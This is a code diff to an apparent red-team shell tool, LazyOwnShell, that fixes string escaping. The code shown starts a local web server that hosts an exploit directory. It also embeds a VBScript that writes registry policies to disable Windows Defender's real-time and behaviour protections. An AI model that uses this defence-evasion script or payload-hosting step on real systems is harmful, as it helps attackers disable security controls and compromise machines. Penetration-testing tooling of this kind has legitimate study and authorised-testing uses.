@@ -4444,7 +4444,7 @@ class LazyOwnShell(cmd2.Cmd):
             "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
         )
         os.system(
-            'echo "[\\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"'
+            'echo "[\\e[96m`pwd`\\e[0m]\\e[34m" && cd external/.exploit && ls && echo -en "\\e[0m"'
         )
         print_msg(f"Web server at external/.exploit in port {RED} 8443 {RESET}")
         os.system("cd external/.exploit && python3 -m http.server 8443")
@@ -5075,13 +5075,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         On Error Resume Next
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",1,"REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection","1","REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable","1","REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification","1","REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection","1","REG_DWORD"
-        WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",1,"REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableOnAccessProtection","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableScanOnRealtimeEnable","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRawWriteNotification","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection","1","REG_DWORD"
+        WshShell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableBehaviorMonitoring","1","REG_DWORD"
 
         WScript.Sleep 100
 
